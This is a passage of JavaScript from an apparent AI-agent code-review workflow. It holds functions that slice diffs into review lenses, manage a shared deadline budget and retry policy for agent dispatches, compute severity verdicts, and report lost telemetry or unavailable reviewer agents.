/** @param {string[]} body @param {number} i @returns {{ out: number[], skip: number }} */
function gitPathChunk(body, i) {
  if (body[i] !== '\\') return { out: utf8Bytes(/** @type {string} */ (body[i])), skip: 0 }
  /** @type {Record<string, number>} */
  const SIMPLE = { a: 7, b: 8, t: 9, n: 10, v: 11, f: 12, r: 13, '"': 34, '\\': 92 }
  const c = body[i + 1]
  if (c === undefined) return { out: utf8Bytes('\\'), skip: 0 }
  if (Object.prototype.hasOwnProperty.call(SIMPLE, c)) return { out: [/** @type {number} */ (SIMPLE[c])], skip: 1 }
  const octal = body.slice(i + 1, i + 4).join('')
  if (/^[0-7]{3}$/.test(octal)) return { out: [parseInt(octal, 8)], skip: 3 }
  return { out: utf8Bytes('\\'), skip: 0 }
}

const MAX_SHARED_PER_SLICE = 8

const SHARED_SUFFIXES = ['.lock', '.yml', '.yaml', '.toml', '.json']

const GROUP_DEPTH = 2

/** @param {string} file */
function isShared(file) {
  return SHARED_SUFFIXES.some(s => file.endsWith(s))
}

/**
 * @param {string} file
 * @param {number} [depth]
 */
function groupKey(file, depth = GROUP_DEPTH) {
  const parts = String(file).split('/')
  return parts.length <= depth ? (parts.slice(0, -1).join('/') || '.') : parts.slice(0, depth).join('/')
}

/**
 * @typedef {{ key: string, files: string[] }} Group
 */
/**
 * @param {Group} group
 * @param {number} cap
 * @param {number} depth
 * @returns {Group[]}
 */
function splitDeep(group, cap, depth) {
  if (group.files.length <= cap || depth > 8) return [group]
  /** @type {Map<string, string[]>} */
  const byKey = new Map()
  for (const f of group.files) {
    const k = groupKey(f, depth)
    const bucket = byKey.get(k)
    if (bucket) bucket.push(f)
    else byKey.set(k, [f])
  }
  if (byKey.size <= 1) {
    const deeper = splitDeep(group, cap, depth + 1)
    return deeper.length > 1 ? deeper : [group]
  }
  return [...byKey.entries()].flatMap(([key, files]) => splitDeep({ key, files }, cap, depth + 1))
}

/**
 * @param {string} a
 * @param {string} b
 */
function commonPrefixLength(a, b) {
  const x = String(a).split('/')
  const y = String(b).split('/')
  let n = 0
  while (n < x.length && n < y.length && x[n] === y[n]) n++
  return n
}

/**
 * @param {string} a
 * @param {string} b
 */
function mergedKey(a, b) {
  const n = commonPrefixLength(a, b)
  return n > 0 ? String(a).split('/').slice(0, n).join('/') : `${a} + ${b}`
}

/**
 * @param {string} key
 * @param {Group[]} groups
 */
function uniqueKey(key, groups) {
  if (!groups.some(g => g.key === key)) return key
  let n = 2
  while (groups.some(g => g.key === `${key} (${n})`)) n++
  return `${key} (${n})`
}

/**
 * Partition changed files into cohesive slices.
 *
 * Returns `[]` when slicing is not worth it — fewer files than `minFiles`, or only one group — and
 * the caller then dispatches the lens against the whole diff as before. Returning an empty array
 * rather than a single all-files group is deliberate: "do not slice" and "slice into one" are
 * different instructions to the caller, and collapsing them hides which one happened.
 *
 * Each slice is `{ key, files }` where `files` INCLUDES the shared files, so every slice can check
 * the code it holds against the manifest that declares it.
 */
/**
 * @param {unknown} files
 * @param {{ minFiles?: number, maxSlices?: number, maxFilesPerSlice?: number, owns?: ((f: string) => boolean) | null }} [opts]
 * @returns {Group[]}
 */
function sliceDiff(files, { minFiles = 12, maxSlices = 6, maxFilesPerSlice = 0, owns = null } = {}) {
  const { shared, owned } = partitionOwned((Array.isArray(files) ? files : []).map(String).filter(Boolean), owns)
  if (owned.length < minFiles) return []

  const byKey = groupFilesByKey(owned)
  if (byKey.size <= 1) return []

  const cap = maxFilesPerSlice > 0 ? maxFilesPerSlice : Math.max(1, Math.ceil(owned.length / maxSlices))
  const groups = mergeNearestGroups([...byKey.entries()]
    .flatMap(([key, fs]) => splitDeep({ key, files: fs }, cap, GROUP_DEPTH + 1))
    .sort(largestGroupFirst), maxSlices, cap)
  groups.sort(largestGroupFirst)

  return groups.map(g => ({ key: g.key, files: [...g.files, ...shared] }))
}

/**
 * @param {string[]} all
 * @param {((f: string) => boolean) | null} owns
 * @returns {{ shared: string[], owned: string[] }}
 */
function partitionOwned(all, owns) {
  /** @type {(f: string) => boolean} */
  const isOwned = typeof owns === 'function' ? owns : f => !isShared(f)
  const sharedAll = all.filter(isShared)
    .sort((a, b) => a.split('/').length - b.split('/').length || a.localeCompare(b))
  const shared = sharedAll.slice(0, MAX_SHARED_PER_SLICE)
  const evicted = sharedAll.slice(MAX_SHARED_PER_SLICE).filter(isOwned)
  return { shared, owned: all.filter(f => isOwned(f) && !isShared(f)).concat(evicted) }
}

/** @param {string[]} owned @returns {Map<string, string[]>} */
function groupFilesByKey(owned) {
  /** @type {Map<string, string[]>} */
  const byKey = new Map()
  for (const f of owned) {
    const k = groupKey(f)
    const bucket = byKey.get(k)
    if (bucket) bucket.push(f)
    else byKey.set(k, [f])
  }
  return byKey
}

/** @param {Group} a @param {Group} b */
function largestGroupFirst(a, b) {
  return b.files.length - a.files.length || a.key.localeCompare(b.key)
}

/**
 * @param {Group[]} start
 * @param {number} maxSlices
 * @param {number} cap
 * @returns {Group[]}
 */
function mergeNearestGroups(start, maxSlices, cap) {
  let groups = start
  while (groups.length > maxSlices) {
    const pick = pickMerge(groups, cap)
    const a = /** @type {Group} */ (groups[pick.i])
    const b = /** @type {Group} */ (groups[pick.j])
    groups = groups.filter((_unused, idx) => idx !== pick.i && idx !== pick.j)
    groups.push({ key: uniqueKey(mergedKey(a.key, b.key), groups), files: [...a.files, ...b.files] })
  }
  return groups
}

/**
 * @param {Group[]} groups
 * @param {number} cap
 * @returns {{ i: number, j: number, shared: number, size: number }}
 */
function pickMerge(groups, cap) {
  /** @type {{ i: number, j: number, shared: number, size: number } | null} */
  let best = null
  /** @type {{ i: number, j: number, shared: number, size: number } | null} */
  let fallback = null
  for (let i = 0; i < groups.length; i++) {
    for (let j = i + 1; j < groups.length; j++) {
      const cand = mergeCandidate(groups, i, j)
      if (!fallback || cand.size < fallback.size) fallback = cand
      if (cand.size <= cap && closerMerge(cand, best)) best = cand
    }
  }
  return /** @type {{ i: number, j: number, shared: number, size: number }} */ (best || fallback)
}

/**
 * @param {Group[]} groups @param {number} i @param {number} j
 * @returns {{ i: number, j: number, shared: number, size: number }}
 */
function mergeCandidate(groups, i, j) {
  const gi = /** @type {Group} */ (groups[i])
  const gj = /** @type {Group} */ (groups[j])
  return { i, j, shared: commonPrefixLength(gi.key, gj.key), size: gi.files.length + gj.files.length }
}

/**
 * @param {{ shared: number, size: number }} cand
 * @param {{ shared: number, size: number } | null} best
 */
function closerMerge(cand, best) {
  return !best || cand.shared > best.shared || (cand.shared === best.shared && cand.size < best.size)
}

/** @param {string} lens */
function sliceableLens(lens) {
  return !WHOLE_DIFF_LENSES.includes(String(lens))
}

/**
 * Lenses that must NOT be sliced, and why each one.
 *
 * These judge the diff AS A WHOLE, so a slice of it is not a smaller version of their question —
 * it is a different and wrong question. `negative-space` looks for what is missing, and absence is
 * only visible against the whole change. `intent` checks the author's stated claims, which are
 * stated about the change entire. `compat` asks what an other-versioned reader makes of the new
 * wire shapes, and a shape is only breaking in relation to every producer and consumer in the diff.
 *
 * `invariants` and `failure-windows` are here for a sharper reason than the other three, and they
 * were missed on the first pass. Their briefs are MIRROR WALKS: invariants asks, for each site,
 * where its mirror is — client against server, send against receive, offered against accepted — and
 * failure-windows asks for interleavings BETWEEN two components. Both halves of such a pair are
 * ordinary source files, so the shared-file rule does not reach them, and in a real tree the two
 * halves live in different modules by construction: a handler in one binary, the contract type in
 * another crate. Slice them and a guard present on one side with its mirror missing on the other is
 * visible to NO agent — the one concrete class of defect this partition would otherwise delete in
 * silence, which is the failure mode the whole engine exists to prevent.
 *
 * Everything else is code-intrinsic: it judges code by properties the code has in front of it.
 */
const WHOLE_DIFF_LENSES = ['negative-space', 'intent', 'compat', 'invariants', 'failure-windows']

const LENS_WINDOW_AGENTS = 16

/** @param {unknown} file */
function pathspecLiteral(file) {
  const f = String(file ?? '')
  return f ? `:(literal)${f}` : ''
}
// <<< craft-inline

// ---- one budget, shared by the attempts ----
// Pure helper, tested as a real module in lib/agent-deadline.mjs and pasted back here by the
// craft-inline gate. The rationale for a shared budget — and why the thresholds themselves must NOT
// move — lives there.
// >>> craft-inline lib/agent-deadline.mjs deadlineSpan deadlineArm makeDeadlineBudget
/** @param {number} totalMs @param {number} floorMs @returns {{ capped: number, floor: number }} */
function deadlineSpan(totalMs, floorMs) {
  const total = Number(totalMs)
  const capped = Number.isFinite(total) && total > 0 ? total : 0
  return { capped, floor: Math.max(0, Math.min(capped, Number(floorMs) || 0)) }
}

/**
 * @template H
 * @param {((fn: () => void, ms: number) => H) | undefined} schedule
 * @param {((t: H) => void) | undefined} cancel
 * @returns {(fn: () => void, ms: number) => () => void}
 */
function deadlineArm(schedule, cancel) {
  return schedule && cancel
    ? (fn, ms) => { const t = schedule(fn, ms); return () => cancel(t) }
    : (fn, ms) => { const t = setTimeout(fn, ms); return () => clearTimeout(t) }
}

/**
 * `schedule` and `cancel` come as a pair: a handle is only ever cancelled by the scheduler that issued
 * it, so its type `H` is the scheduler's own and stays opaque here.
 *
 * @template H
 * @param {number} totalMs
 * @param {{ floorMs?: number } & ({ schedule?: undefined, cancel?: undefined } | { schedule: (fn: () => void, ms: number) => H, cancel: (t: H) => void })} [opts]
 */
function makeDeadlineBudget(totalMs, { floorMs = 0, schedule, cancel } = {}) {
  const { capped, floor } = deadlineSpan(totalMs, floorMs)

  let expired = capped === 0
  let belowFloor = capped === 0 || floor >= capped
  /** @type {((v: typeof DEADLINE_HIT) => void) | null} */
  let resolveHit = null
  const arm = deadlineArm(schedule, cancel)
  /** @type {Array<() => void>} */
  const timers = []

  /** @type {Promise<typeof DEADLINE_HIT>} */
  const hit = capped === 0
    ? Promise.resolve(DEADLINE_HIT)
    : new Promise(resolve => { resolveHit = resolve })

  if (capped > 0) {
    timers.push(arm(() => { expired = true; belowFloor = true; if (resolveHit) resolveHit(DEADLINE_HIT) }, capped))
    if (floor > 0 && floor < capped) timers.push(arm(() => { belowFloor = true }, capped - floor))
  }

  return {
    hit,
    expired: () => expired,
    belowFloor: () => belowFloor,
    total: () => capped,
    dispose: () => { for (const disarm of timers) disarm() },
  }
}
// <<< craft-inline

const DEADLINE_HIT = { craftDeadline: true }
const DEFAULT_DEADLINE_MS = 1800000
/** @type {Record<string, number>} */
const PHASE_DEADLINE_MS = { Scout: 900000, Gate: 1800000, Lenses: 5400000, Verify: 1800000, Adjudicate: 1800000, Synthesize: 1800000 }
// A caller-supplied ceiling, applied to every phase that does not name its own. It only ever
// REPLACES the per-phase table, never the explicit `deadlineMs` an individual dispatch passes —
// preflight's 5min is a property of preflight, not a default to be overridden from the outside.
const deadlineArg = deadlineArgMs()
function deadlineArgMs() {
  return Number(A['deadlineMs']) > 0 ? Number(A['deadlineMs']) : 0
}
// The CEILING on the smallest remainder a re-dispatch is allowed to be launched into — not the
// floor itself, which is derived from the budget by `retryFloorFor` below. A POLICY DECISION, not a
// measurement: nothing recorded derives it. It is set against the measured live distribution from
// the other side — live verifiers answer in tens of seconds, so against an ordinary phase budget a
// remainder under a minute is a poor bet and mostly buys a harness slot to time out in.
// That reasoning is scale-bound, and the scaling below is the admission of it: under a budget of
// 100s the floor is 50s, and a re-dispatch does then go out into a remainder this paragraph would
// have called implausible. The trade is deliberate. A floor that cannot adapt is worse, because
// against a budget shorter than itself it is true before anything has run and removes the retry
// ladder entirely, which is a silent behaviour change rather than a judged bet.
const RETRY_FLOOR_MS = 60000
// The floor is RELATIVE to the budget it guards, never a flat minute. A flat minute against a
// budget SHORTER than a minute is true before the first attempt even runs, so every agent in such a
// run loses its re-dispatch — the whole retry ladder the death breaker is calibrated against
// vanishes, and the transcript says "no wall clock left to wait in" over a budget that has barely
// been touched. `deadlineMs=30000` is a documented diagnostic setting, so this is reachable, not
// theoretical. Half the budget is the cap: it keeps the guard meaningful at every scale, since a
// remainder under half of what the first attempt had is a poor bet whatever the absolute numbers.
const retryFloorMs = (/** @type {unknown} */ totalMs) => Math.min(RETRY_FLOOR_MS, Math.floor((Number(totalMs) > 0 ? Number(totalMs) : 0) / 2))
// SAID OUT LOUD, once, at the top of the run. This one argument replaces the WHOLE phase table,
// including the 90 minutes a lens is legitimately allowed (one measured lens ran 46). Set too low it
// kills live work by deadline, and a run full of deadline fires is indistinguishable, in the
// transcript, from the API outage this code was written for — so the mistake would be diagnosed as
// the very thing it imitates. Naming the override where a reader meets it first is the cheapest
// defence there is; the transcript is the only carrier the run's clock is ever measured from.
function announceDeadlineOverride() {
  if (deadlineArg) {
    // BOTH DIRECTIONS. The argument replaces the table, so it lengthens as readily as it shortens, and
    // a phase given four times its budget changes what the run does just as surely — it is simply
    // slower to notice. Naming only the cuts left the other half of the override unrecorded in the one
    // place this run's clock is ever read from.
    // Sub-minute values print as seconds. Rounding a 30s override to "0min" is the same defect the
    // deadline log was fixed for, inverted — and worse here, because 30000 is exactly the documented
    // diagnostic value this warning exists to explain, so the one reader it was written for is the one
    // it would mislead.
    const m = (/** @type {number} */ v) => (v >= 60000 ? `${Math.round(v / 60000)}min` : `${Math.max(1, Math.round(v / 1000))}s`)
    const moved = (/** @type {number} */ dir) => Object.entries(PHASE_DEADLINE_MS).filter(([, v]) => (dir < 0 ? v > deadlineArg : v < deadlineArg)).map(([k, v]) => `${k} ${m(v)}→${m(deadlineArg)}`)
    const shortened = moved(-1)
    const lengthened = moved(1)
    log(`⏱️ deadlineMs=${deadlineArg} replaces the per-phase deadline table for every phase that does not name its own`
      + `${shortened.length ? ` — SHORTENING ${shortened.join(', ')}. A phase cut below the live distribution will fire its deadline on healthy agents, and a transcript full of deadline fires reads like an API outage.` : ''}`
      + `${lengthened.length ? ` — LENGTHENING ${lengthened.join(', ')}.` : ''}`
      // Scoped honestly: the floor is derived per dispatch, and a dispatch that names its own deadline
      // (preflight's 5 minutes) is not overridden by this argument at all, so its floor stays the full
      // minute. Stating the drop globally would hand the transcript's reader a calibration that holds
      // for most agents and not all — and a wrong calibration is read with the same confidence as a
      // right one.
      + `${deadlineArg < RETRY_FLOOR_MS * 2 ? ` NOTE: for the phases this argument governs, the re-dispatch floor drops with it to ${Math.round(Math.floor(deadlineArg / 2) / 1000)}s, so a dead agent gets a much shorter second attempt than usual; a dispatch carrying its own deadline keeps its own floor.` : ''}`)
  }
}
announceDeadlineOverride()
/** @param {AgentOpts} opts */
function deadlineMsFor(opts) {
  const explicit = Number(opts.deadlineMs)
  if (Number.isFinite(explicit) && explicit > 0) return explicit
  return deadlineArg || (PHASE_DEADLINE_MS[/** @type {string} */ (opts.phase)] ?? DEFAULT_DEADLINE_MS)
}
/**
 * With a tagged `schema`, the validated answer or `null` (dead, skipped, or past its deadline); without
 * one, the agent's final text or `null` — `unknown`, since nothing here validates it.
 * @template [T=unknown]
 * @param {string} prompt
 * @param {AgentOpts & { schema?: Schema<T> | undefined }} [opts]
 * @returns {Promise<T | null>}
 */
async function ragent(prompt, opts = {}) {
  // deadlineMs and breaker are ours, not agent()'s — strip them so neither reaches the harness as an
  // unknown option.
  const { deadlineMs: _deadlineMs, breaker, ...agentOpts } = opts
  const ms = deadlineMsFor(opts)
  // ONE budget for the whole call, not one per attempt. The worst case of a hanging dispatch is
  // therefore `ms` of waiting in total rather than `ms` per attempt — which, in the Verify window,
  // is the difference between one slot held for 30 minutes and one held for an hour.
  // ARMED, not measured: the sandbox has no clock at all (see the module), so every attempt races
  // the SAME timer rather than a fresh one computed from elapsed time.
  const budget = makeDeadlineBudget(ms, { floorMs: retryFloorMs(ms) })
  try {
    // The one place the sandbox's `unknown` becomes the schema's type: agent() validates against the
    // schema it was handed, and `opts.schema` is that schema with the type it validates into.
    return /** @type {T | null} */ (await withBudget(prompt, agentOpts, budget, breaker, opts))
  } finally {
    // The armed timers outlive the answer otherwise, holding the run open for the whole deadline.
    budget.dispose()
  }
}

/** @param {string} prompt @param {AgentOptions} agentOpts @param {ReturnType<typeof makeDeadlineBudget>} budget @param {ReturnType<typeof makeDeathBreaker> | null | undefined} breaker @param {AgentOpts} opts @returns {Promise<unknown>} */
async function withBudget(prompt, agentOpts, budget, breaker, opts) {
  for (let attempt = 1; ; attempt++) {
    const o = attempt === 1 ? agentOpts : { ...agentOpts, label: `retry:${agentOpts.label || 'agent'}` }
    // The SHARED deadline promise, not a per-attempt timer. A second attempt inherits what is left
    // of the first one's wait by construction — there is nothing to subtract and no clock to read.
    const res = await Promise.race([agent(`${REPO_DIRECTIVE}${prompt}`, o), budget.hit])
    // Asked AFTER the race, so it reflects the state the attempt actually ended in. A re-dispatch
    // launched below the floor would fire the deadline before the agent could answer, costing a
    // harness slot to produce nothing.
    const spentOut = budget.belowFloor()
    if (res === DEADLINE_HIT) {
      logDeadlineFire(o, budget)
      return null
    }
    if (res !== null && res !== undefined) {
      // A live answer enters the window as one observation of a reachable API: an outage that ended
      // slides out of the window and the re-dispatch comes back for the next isolated failure.
      if (breaker) breaker.recordLive()
      return res
    }
    if (!redispatchAfterDeath(attempt, spentOut, budget, breaker, opts)) return null
  }
}

/** A deadline fire, logged against the budget it spent. @param {AgentOptions} o @param {ReturnType<typeof makeDeadlineBudget>} budget */
function logDeadlineFire(o, budget) {
  // Deliberately neither counted by the breaker nor a reset of it: a deadline fire cannot be
  // told apart from a live agent taking too long, and feeding that into the window would let slow
  // work suppress the retry that real work depends on. The breaker reads deaths, never durations.
  // THE BUDGET, NOT WHAT THIS ATTEMPT WAITED, and the log says which. With no clock there is no
  // honest per-attempt figure — an earlier version printed one and it was wrong by most of the
  // deadline on a second attempt. A number nobody computed is worse than a coarser number that
  // is true, because the transcript is the only carrier this run's clock is ever measured from
  // and a reader calibrates deadlines against what it says.
  // Sub-minute budgets print as seconds rather than rounding up to "1min": `deadlineMs=30000` is
  // a documented diagnostic value, and a log calling it "0min" or "1min" hides the very setting
  // whose effects the reader is trying to see.
  const ms = budget.total()
  const waited = ms >= 60000 ? `${Math.round(ms / 60000)}min budget` : `${Math.max(1, Math.round(ms / 1000))}s budget`
  // A DEADLINE FIRE NEVER RE-DISPATCHES, and this is an identity rather than a policy: the timer
  // is armed ONCE, for the whole budget, when the budget is created — so its firing IS the budget
  // running out, and one budget shared by the attempts leaves the next one nothing to wait in. The branch that used to re-dispatch here
  // is unreachable under that arithmetic, so it is gone rather than left as reassuring dead text.
  // The re-dispatch survives for the case it was always really for: the FAST death, which spends
  // almost none of the budget. A hang is evidence about the request; a fast death is evidence
  // about reachability, and only the second is worth asking twice.
  log(`⏱️ agent '${o.label || '?'}' exhausted its ${waited} with no response — abandoning the wait (the deadline is one budget shared by the attempts and a fire spends it, so there is nothing left to re-dispatch into; treated as a dead agent)`)
}

/**
 * After an attempt that came back empty: whether to re-dispatch (true) or treat the agent as dead (false).
 * @param {number} attempt @param {boolean} spentOut @param {ReturnType<typeof makeDeadlineBudget>} budget
 * @param {ReturnType<typeof makeDeathBreaker> | null | undefined} breaker @param {AgentOpts} opts @returns {boolean}
 */
function redispatchAfterDeath(attempt, spentOut, budget, breaker, opts) {
  if (attempt >= AGENT_TRIES) return false
  // A death that arrived slowly can exhaust the budget too, and then the re-dispatch buys nothing.
  if (spentOut) {
    // Says how much was left and what it was measured against, rather than the flat "nothing left"
    // that used to be printed over a remainder that was merely below the floor. The transcript is
    // the only carrier this run's clock is ever measured from, and "spent" and "below the floor"
    // are different events that a future reader has to be able to tell apart.
    log(`⏱️ agent '${opts.label || '?'}' returned no result with less than the ${Math.round(retryFloorMs(budget.total()) / 1000)}s floor left of its ${Math.round(budget.total() / 1000)}s deadline budget — NOT re-dispatching (a second attempt would time out before it could answer); treated as a dead agent`)
    return false
  }
  // The dead-agent route, and the expensive one: `agent()` resolved null after the harness spent
  // its own retry ladder on an unreachable API, and the re-dispatch below spends a second ladder
  // inside the same verification window slot. On a one-off failure that is worth the clock; once
  // half of the recent windowed dispatches are coming back empty it is not, and the breaker's
  // window is what says which this is.
  //
  // The log says exactly what the breaker counted and nothing more. Only a FIRST attempt reaches
  // this line (the line above returns on the last one), so the window holds one observation per
  // dispatched unit of work — never per harness call. A message phrased as "the Nth death in a
  // row" claimed both a consecutive run the window does not track and a count of dispatches it
  // does not hold: with one re-dispatch per death, an outage of N observed deaths has already
  // cost up to 2N−(suppressed) harness dispatches.
  if (breaker && !breaker.deathAllowsRedispatch()) {
    log(`⛔ agent '${opts.label || '?'}' returned no result — ${breaker.deaths()} of the last ${breaker.observed()} windowed verification dispatches returned nothing, so this one is NOT re-dispatched (the re-dispatch is for a one-off failure, and at this rate it is not one); treated as a dead agent, reported as unverified exactly like every other death`)
    return false
  }
  log(`⚠️ agent '${opts.label || '?'}' returned no result (API death or skip) — re-dispatching once`)
  return true
}

// ---- run-record helpers (VERBATIM mirror of lib/run-record.mjs — the sandbox can't import; keep in sync) ----
// Mirrors: countBySeverity, summarizeFindings, reviewVerdict, titleShingle,
// fingerprint, shingleOverlap, matchesPrior,
// rereviewVerdict. (selectPriorRound is NOT mirrored: round selection, ancestry and record loading
// now happen in `craft-log-run.mjs prior-round`, so no mirror is needed — a haiku still runs the
// command and carries the bytes back, but it decides nothing.)
// >>> craft-inline lib/run-record.mjs SEVERITIES countBySeverity summarizeFindings reviewVerdict refuteRate
/** @type {Severity[]} */
const SEVERITIES = ['Critical', 'High', 'Medium', 'Low', 'Info']

/**
 * @param {unknown} findings
 * @returns {Record<Severity, number>}
 */
function countBySeverity(findings) {
  const by = { Critical: 0, High: 0, Medium: 0, Low: 0, Info: 0 }
  for (const f of (Array.isArray(findings) ? findings : [])) {
    if (f && Object.prototype.hasOwnProperty.call(by, f.severity)) by[/** @type {Severity} */ (f.severity)] += 1
  }
  return by
}

/**
 * @param {unknown} findings
 * @returns {{ total: number, bySeverity: Record<Severity, number> }}
 */
function summarizeFindings(findings) {
  const bySeverity = countBySeverity(findings)
  return { total: SEVERITIES.reduce((n, s) => n + bySeverity[s], 0), bySeverity }
}

/**
 * @param {unknown} confirmed
 * @returns {string}
 */
function reviewVerdict(confirmed) {
  const by = countBySeverity(confirmed)
  if (by.Critical || by.High) return 'Block'
  if (by.Medium) return 'Warning'
  return 'Approve'
}

/**
 * @param {number} refuted
 * @param {number} candidates
 * @returns {number}
 */
function refuteRate(refuted, candidates) {
  return candidates ? Math.round((refuted / candidates) * 100) / 100 : 0
}
// <<< craft-inline
// finalVerdict is workflow-local — NOT part of the lib/run-record.mjs mirror above.
// In strict mode the maintainability bar is a presumption of block: any Confirmed
// maintainability finding at Medium or above escalates the verdict to Block. Outside strict mode
// the base verdict stands (maintainability findings are at most a Warning).
// A finding counts as maintainability for the strict escalation if its own source is maintainability
// OR a maintainability finding was merged into it during cross-lens dedup (dedupPool carries every
// contributing source in `sources`). Without the second clause a maintainability finding absorbed
// under a same-severity non-maintainability base would silently escape the strict Block.
/** @param {Finding} f */
function isMaintainability(f) {
  return (f['source'] || '') === 'maintainability' || (Array.isArray(f['sources']) && /** @type {unknown[]} */ (f['sources']).includes('maintainability'))
}
/** @param {Finding[]} confirmed */
function finalVerdict(confirmed) {
  if (strict && confirmed.some(f => isMaintainability(f)
    && (f['severity'] === 'Critical' || f['severity'] === 'High' || f['severity'] === 'Medium'))) return 'Block'
  return reviewVerdict(confirmed)
}
// indexProjection is NOT mirrored here any more: lib/craft-log-run.mjs imports the real one and owns
// the index line. A second copy in the workflow would be a copy nothing calls — free to drift out of
// sync with the projection that actually gets written, which is the worst kind of dead code.
// A phase checkpoint. Small by construction — counts, per-lens yields, the gate verdict — because
// its job is to survive the run, not to duplicate the final record early. `runDir` is threaded back
// out of the first call so every later checkpoint lands in the same directory without the sandbox
// needing a clock or a run id (it has neither).
// Telemetry is written by an agent shelling out to lib/craft-log-run.mjs, so it fails for reasons the
// run itself survives: a craftRoot that no longer exists, a dead logger agent, a damaged store. That
// failure used to be pure silence — the review finished, the store stayed empty, and an empty store
// is indistinguishable from "this review was never run" (realm @nick/craft, node #24).
// The choice is deliberate and recorded (realm @nick/craft, node #34): a lost record NEVER fails the
// run. Killing a three-hour review over a bookkeeping write would teach everyone to ignore the very
// marker this exists to raise. It is reported instead, in the report a human actually reads.
/** @type {string[]} */
const telemetryLost = []
/** @param {string} what @param {unknown} [why] */
function noteTelemetryLoss(what, why) {
  const line = `${what}${why ? ` — ${why}` : ''}`
  telemetryLost.push(line)
  log(`⚠️ telemetry lost: ${line}`)
}
// The bookkeeping calls — the run record, the phase checkpoints, the prior-round read — must not
// take the run down when they throw. `quietly` is the shared wrapper (lib/run-logging.mjs, inlined
// below); here it is bound to `ragent` so the retry-once behaviour still applies underneath.
// The wrapper is generic over the callback, so what it yields is ragent's answer, null, or the throw.
const ragentQuietly = quietly(ragent)
/**
 * A quiet call's outcome split in two: the answer (null when the agent died OR threw), and the throw's
 * message ('' when it did not throw).
 * @template T
 * @param {T | { __threw: string } | null} res
 * @returns {{ answer: T | null, threw: string }}
 */
function splitThrew(res) {
  if (res && typeof res === 'object' && '__threw' in res) return { answer: null, threw: String(res.__threw) }
  return { answer: /** @type {T | null} */ (res), threw: '' }
}

// Re-review memory outcome, surfaced in the user-facing report (realm @nick/craft #104). A DETACHED
// HEAD makes the prior-round lookup return 'no-branch', so the run silently becomes round 1 with no
// chaining and no signal. `reReviewMemory` (below) sets this note; it is null on every run that chained
// normally or is a genuine first review, so the section is empty then. Declared before `out()` so an
// early exit that returns before the prior-round read sees a plain null, never a temporal-dead-zone.
/** @type {string | null} */
let reReviewMemoryNote = null
// Prepended by `out()` — near the top, above the verdict — because a re-review that quietly forgot its
// memory must be visible before the verdict, not buried after it.
const reReviewMemorySection = () => (reReviewMemoryNote ? `## ⚠️ Re-review memory off\n${reReviewMemoryNote}\n\n` : '')
// realm @nick/craft #113: a profile whose dedicated reviewer agent is not registered in this session
// (typically: the craft plugin is not enabled in this project) runs every lens on the generic subagent.
// The review still happens — but without the agent's rubric, and the operator otherwise sees only a
// failed probe. Stated above the verdict, with the fix; recorded on the run record.
/** @type {{ id: string, agent: string, error: string }[]} */
const reviewerAgentUnavailable = []
// The agent-type match and the section text are shared with rust-audit (lib/agent-fallback.mjs).
// >>> craft-inline lib/agent-fallback.mjs isAgentTypeMissing agentUnavailableSection agentUnavailableRecord
/** @param {unknown} msg @param {string} [agent] */
function isAgentTypeMissing(msg, agent) {
  const m = String(msg ?? '')
  return /not found/i.test(m) && (/agent type/i.test(m) || (!!agent && m.includes(agent)))
}

/**
 * @param {{ agent: string, what: string, error?: string }[]} missing
 * @param {{ agent: string, count: number, what: string, error?: string }[]} emptied
 * @returns {string}
 */
function agentUnavailableSection(missing, emptied) {
  const hard = Array.isArray(missing) ? missing : []
  const soft = (Array.isArray(emptied) ? emptied : []).filter(x => x && x.count > 0)
  if (!hard.length && !soft.length) return ''
  /** @param {unknown} e */
  const quote = e => String(e).replace(/\s+/g, ' ').trim().slice(0, 160)
  const lines = [
    ...hard.map(x => `- \`${x.agent}\` is not registered in this session, so ${x.what} went to the generic subagent, without that agent's rubric — this run is weaker than a normal one, not broken.${x.error ? ` (${quote(x.error)})` : ''}`),
    ...soft.map(x => x.error
      ? `- \`${x.agent}\` failed with "${quote(x.error)}" on ${x.count} ${x.what}, which were re-run on the generic subagent, without its rubric (an unregistered agent in wording this engine does not recognise, or a missing model or tool).`
      : `- \`${x.agent}\` returned nothing for ${x.count} ${x.what}, which were re-run on the generic subagent, without its rubric (an unregistered agent on some runtimes, or a transient failure).`),
  ]
  const fix = hard.length ? 'Enable the plugin in this project (`/plugin install craft@craft`, project or local scope) and re-run to use it.\n' : ''
  return `## ⚠️ Reviewer agent unavailable\n${lines.join('\n')}\n${fix}\n`
}

/**
 * @param {Iterable<string>} missing
 * @param {{ agent: string, count: number }[]} fallbacks
 * @returns {{ agentUnavailable: string[], agentFallbacks: Record<string, number> }}
 */
function agentUnavailableRecord(missing, fallbacks) {
  /** @type {Record<string, number>} */
  const agentFallbacks = {}
  for (const x of fallbacks) if (x.count > 0) agentFallbacks[x.agent] = (agentFallbacks[x.agent] || 0) + x.count
  return { agentUnavailable: [...new Set(missing)].sort(), agentFallbacks }
}
// <<< craft-inline
/** @param {Profile} profile @param {unknown} error */
function noteReviewerAgentMissing(profile, error) {
  if (!reviewerAgentUnavailable.some(x => x.id === profile.id)) reviewerAgentUnavailable.push({ id: profile.id, agent: profile.reviewerAgent, error: String(error || '').slice(0, 160) })
}
// Lens dispatches that came back EMPTY from the reviewer agent and were re-run on the generic
// subagent. On some runtimes that is how an unknown agent type looks; it can also be a transient
// death, so it is not taken as "missing" — but it is said, per profile, rather than staying silent.
/** @type {Record<string, number>} */
const reviewerAgentFallbacks = {}
/** @type {Record<string, string>} */
const reviewerAgentNames = {}           // profile id -> its reviewer agent type, for the report line
// Lens dispatches whose reviewer agent threw a "not found" isAgentTypeMissing does not recognise and the
// generic subagent then answered: the sandbox's wording for an unregistered type is not yet observed (#152),
// so the lens keeps its coverage rather than dying on a guess about the text. Also in the record count.
/** @type {Record<string, { count: number, error: string }>} */
const reviewerAgentNotFound = {}
/** @param {Profile} profile */
function noteReviewerAgentFallback(profile) {
  reviewerAgentFallbacks[profile.id] = (reviewerAgentFallbacks[profile.id] || 0) + 1
  reviewerAgentNames[profile.id] = profile.reviewerAgent
}
/** @param {Profile} profile @param {string} error */
function noteReviewerAgentNotFound(profile, error) {
  const was = reviewerAgentNotFound[profile.id]
  reviewerAgentNotFound[profile.id] = { count: (was?.count || 0) + 1, error }
  reviewerAgentFallbacks[profile.id] = (reviewerAgentFallbacks[profile.id] || 0) + 1
  reviewerAgentNames[profile.id] = profile.reviewerAgent
}
const reviewerAgentSection = () => agentUnavailableSection(
  reviewerAgentUnavailable.map(x => ({ agent: x.agent, what: `every ${x.id} lens`, error: x.error })),
